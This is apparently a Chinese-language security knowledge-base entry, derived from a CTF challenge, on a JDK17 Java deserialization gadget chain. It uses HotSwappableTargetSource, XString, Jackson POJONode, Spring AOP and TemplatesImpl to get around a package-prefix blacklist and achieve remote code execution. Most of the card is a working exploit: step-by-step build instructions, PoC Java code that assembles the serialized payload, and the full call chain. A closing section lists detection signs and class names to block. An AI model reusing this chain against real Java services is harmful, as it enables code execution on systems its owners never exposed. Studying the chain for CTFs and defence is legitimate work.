---
id: web-java-deserialization-blacklist-hotswappable-xstring-pojonode-spring-aop
title: 黑名单封禁 javax.swing/java.security 后的 JDK17 Spring 链：HotSwappableTargetSource+XString 接 POJONode/TemplatesImpl
type: scenario
domain: web
path: web/java/deserialization
technique: blacklist-hotswappable-xstring-pojonode-spring-aop
tags:
- java
- deserialization
- jdk17
- spring
- aop
- jackson
- pojonode
- xstring
- hotswappabletargetsource
- templatesimpl
- blacklist-bypass
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T09:57:02+08:00'
  notes: 已对照原文与全部 13 张图核对：openjdk:17、jackson 2.13.5/spring 5.3.27、CoffeeObjectInputStream 前缀黑名单 javax.swing/java.security、JDK17 BAVE readObject 仅接受 String、HotSwappableTargetSource+XString+POJONode 弹计算器调用栈、/malicious?cmd=cat /f* 均吻合；PoC 未执行
url: /docs/web/java/deserialization/web-java-deserialization-blacklist-hotswappable-xstring-pojonode-spring-aop/
draft: false
kb_aliases:
- black coffee
- more black coffee
- HotSwappableTargetSource XString POJONode
- JDK17 Spring 黑名单绕过
- javax.swing java.security 黑名单
- XString equals POJONode toString
- VNCTF 2026 black coffee
---

## 一句话结论

当反序列化入口按包前缀封禁 `javax.swing` 与 `java.security`（`EventListenerList`、`TextAndMnemonicHashMap`、`SignedObject` 都不可用），且 JDK17 已让 `BadAttributeValueExpException` 失去 toString 触发能力时，仍可用 spring-aop 的 `HotSwappableTargetSource` 包装 `XString` 与 `POJONode` 作为 `HashMap` 的冲突 key：反序列化时 `XString.equals(POJONode)` 调用 `POJONode.toString()`，经 Jackson 序列化 → `JdkDynamicAopProxy` → `TemplatesImpl.getOutputProperties()` 执行字节码。

## 原理

- **入口黑名单**：自定义 `ObjectInputStream.resolveClass` 对类名前缀做 `startsWith` 检查，`javax.swing` 与 `java.security` 开头的类直接抛 `InvalidClassException`，因此 `EventListenerList`、`UndoManager`、`TextAndMnemonicHashMap`、`SignedObject` 等都被卡在类解析阶段。
- **BAVE 在 JDK17 失效**：`BadAttributeValueExpException.readObject` 只接受 `String`/`null` 作为 `val`；非 String 对象会被转成 `identityHashCode@ClassName` 字符串，不再调用 `toString`。
- **仍可用的 source**：JDK 自带 `com.sun.org.apache.xpath.internal.objects.XString`，其 `equals(Object)` 会把对方转成字符串（调用 `toString`）；Spring AOP 的 `HotSwappableTargetSource.equals` 会调用其 target 的 `equals`。把 `XString` 与恶意对象分别包进两个 `HotSwappableTargetSource`，作为 `HashMap` 的 key，反序列化 `HashMap.readObject → putVal → key.equals` 时即可进入 `XString.equals(恶意对象)`。
- **接 POJONode sink**：恶意对象为 Jackson 的 `POJONode`，包裹一个实现 `javax.xml.transform.Templates` 接口的 JDK 动态代理。`POJONode.toString()` 走 `BaseJsonNode.toString → InternalNodeMapper.nodeToString → ObjectMapper.writeValueAsString`，Jackson 按 Bean 序列化代理对象时会调用 `getOutputProperties` getter；该代理的 InvocationHandler 是 Spring AOP 的 `JdkDynamicAopProxy`，`AdvisedSupport.target` 设为 `TemplatesImpl`，于是反射调用 `TemplatesImpl.getOutputProperties()` → `newTransformer()` → 加载 `_bytecodes` 中的类并执行。
- **生成端处理**：`BaseJsonNode.writeReplace` 会把 POJONode 替换成其他序列化形式，需用 Javassist 删除/改写该方法（只影响生成端 JVM）。JDK17 模块封装需用 `Unsafe` 篡改调用者 `Class.module` 后再反射写 `TemplatesImpl` 私有字段。
- **为什么可行**：整条链不依赖被黑名单封禁的 swing/security 类；`HashMap` 的反序列化重放是稳定的入口，`XString` 与 Spring AOP 都在白名单之外但未被封禁，Jackson 与 Spring 是 Spring Boot Web 的默认依赖。

## 触发条件

- 存在 Java 原生反序列化入口，且黑名单只封禁了 `javax.swing`、`java.security` 等部分包，未封禁 `com.sun.org.apache.xpath`、`org.springframework.aop`、`com.fasterxml.jackson.databind.node`、Xalan `TemplatesImpl`。
- classpath 含 spring-aop/spring-context、jackson-databind、Xalan `TemplatesImpl`（JDK 内置或外部 xalan），并可用 `sun.misc.Unsafe` 做模块绕过/字段写入。
- 运行在 JDK17 等高版本（BAVE 触发失效，EventListenerList 又被黑名单封禁），且目标未启用 JEP 290 严格类过滤。
- 攻击者能控制 `HashMap` 的键对象图并完成序列化；POJONode 的 `writeReplace` 已在生成端处理。

## 利用步骤

1. 确认黑名单范围：读取/推断自定义 `ObjectInputStream` 的前缀列表，排除 `javax.swing`、`java.security` 入口。
2. 生成恶意类字节码：用 Javassist 生成继承 `AbstractTranslet` 的类（静态块执行命令/注册内存马），再准备一个占位类；若使用非 AbstractTranslet 的副作用载荷，见 [[web-java-deserialization-templatesimpl-non-abstracttranslet-side-effect]]。
3. 构造 `TemplatesImpl`：`_name`、`_bytecodes={evil, placeholder}`、`_transletIndex=0`；JDK17 先用 `Unsafe` 伪造 `Class.module`，再反射写字段。
4. 构造 Spring AOP 代理：`AdvisedSupport.setTarget(templates)`，反射 `new JdkDynamicAopProxy(advisedSupport)` 作为 InvocationHandler，`Proxy.newProxyInstance(..., new Class[]{Templates.class}, handler)`。
5. `POJONode node = new POJONode(proxy)`；构造两个 `HotSwappableTargetSource`：一个 target 为 `XString("x")`，另一个 target 为 `node`，以能触发 `equals` 的顺序放入 `HashMap`（参考既有 XString 触发卡）。
6. 生成端用 Javassist 删除 `com.fasterxml.jackson.databind.node.BaseJsonNode.writeReplace`，序列化 `HashMap`。
7. 发送序列化数据；反序列化时 `XString.equals(POJONode)` → `POJONode.toString()` → Jackson getter → `JdkDynamicAopProxy` → `TemplatesImpl.getOutputProperties()` → 字节码执行。

## PoC

```java
// 生成端：删除 BaseJsonNode.writeReplace，避免 POJONode 被替换
ClassPool pool = ClassPool.getDefault();
CtClass base = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
base.removeMethod(base.getDeclaredMethod("writeReplace"));
base.toClass(Thread.currentThread().getContextClassLoader(), null);
```

```java
// 1) TemplatesImpl（evil 继承 AbstractTranslet；JDK17 先做 Class.module 伪造）
TemplatesImpl templates = new TemplatesImpl();
setField(templates, "_name", "xxx");
setField(templates, "_bytecodes", new byte[][]{evilBytes, placeholderBytes});
setField(templates, "_transletIndex", 0);

// 2) Spring AOP 代理 Templates 接口
AdvisedSupport as = new AdvisedSupport();
as.setTarget(templates);
Constructor<?> c = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy")
        .getConstructor(AdvisedSupport.class);
c.setAccessible(true);
InvocationHandler handler = (InvocationHandler) c.newInstance(as);
Object proxy = Proxy.newProxyInstance(
        ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

// 3) POJONode + HotSwappableTargetSource + XString
POJONode node = new POJONode(proxy);
HotSwappableTargetSource v1 = new HotSwappableTargetSource(new Object());
HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("x"));
HashMap<Object, Object> map = new HashMap<>();
map.put(v1, v1);
map.put(v2, v2);
setField(v1, "target", node);     // 反序列化时 XString.equals(node) -> node.toString()

// 4) 序列化并发送
byte[] payload = serialize(map);
```

调用链：

```text
HashMap.readObject
  -> putVal -> key.equals
    -> HotSwappableTargetSource.equals
      -> XString.equals(POJONode)
        -> POJONode.toString -> BaseJsonNode.toString -> ObjectMapper.writeValueAsString
          -> BeanPropertyWriter.serializeAsField -> proxy.getOutputProperties()
            -> JdkDynamicAopProxy.invoke -> TemplatesImpl.getOutputProperties
              -> defineTransletClasses -> 静态初始化/构造执行
```

## 变体与关联

- source 变体：若未封禁 `javax.swing`，可用 `EventListenerList → UndoManager.toString → Vector.toString`；若 `java.security` 未封禁，可用 `SignedObject` 做二次反序列化。本文场景是在这两条被 ban 后的替代 source。
- sink 变体：POJONode 包裹的代理接口/getter 可替换为其他“getter 即危险方法”的类；Spring AOP target 也可换成别的可执行对象。
- 关联：[[web-java-deserialization-jdk-xstring-equals-tostring]]（XString+HotSwappable 触发原理）；[[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]（POJONode→Spring AOP→TemplatesImpl sink、writeReplace 与模块绕过）；[[web-java-deserialization-templatesimpl-non-abstracttranslet-side-effect]]（非 AbstractTranslet 载荷执行）。
- 边界：黑名单若改为精确类白名单并封禁 XString/HotSwappable/POJONode/TemplatesImpl，链失效；无 spring-aop/jackson 或无 Xalan TemplatesImpl 时也不成立。

## 检测与防御

- 检测：反序列化流中出现 `HotSwappableTargetSource`、`XString`、`POJONode`、`JdkDynamicAopProxy`、`TemplatesImpl` 的组合；`HashMap` 中出现异常键对象；运行期 Jackson 序列化代理并调用 `getOutputProperties`。
- 防御：不要只按包前缀黑名单，改用精确类白名单并拒绝 `com.sun.org.apache.xpath.**`、`org.springframework.aop.**`、`com.fasterxml.jackson.databind.node.**`、`TemplatesImpl` 等；启用 JEP 290 `ObjectInputFilter`。
- 加固：移除不必要的 spring-aop/Jackson 反序列化面，限制 `sun.misc.Unsafe` 与动态类定义，升级 JDK 并监控反序列化异常栈。
